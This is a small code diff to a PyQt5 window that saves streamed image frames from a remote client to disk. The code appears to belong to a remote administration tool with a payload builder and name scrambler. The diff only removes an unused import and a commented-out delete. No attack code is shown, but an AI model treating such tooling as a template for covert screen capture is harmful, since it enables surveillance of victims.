@@ -16,7 +16,7 @@ import os
 
 from PyQt5 import QtCore,QtWidgets
 from core.utils.file_paths import DSFilePath,ClientPath
-from core.Qt5.icons import IconObj,ImageObj
+from core.Qt5.icons import IconObj
 from core.logging.logging import LoggingUtilitys
 from core.builder.utils.encryption import Scrambler
 from core.utils.utils import Notifications
@@ -35,7 +35,6 @@ class Ui_image_data_window(object):
         file_path = f'{ClientPath().image_data_dir}{Scrambler().scrambleVar(7)}.jpg'
         original_image_data = LoggingUtilitys().receive_file_bytes(DSFilePath().streaming_frame)
         LoggingUtilitys().write_bytes_to_file(file_path,original_image_data)
-        #os.remove(DSFilePath().streaming_frame)
         Notifications().raise_notification(
             f'Saved file as {file_path}',
             'Success'
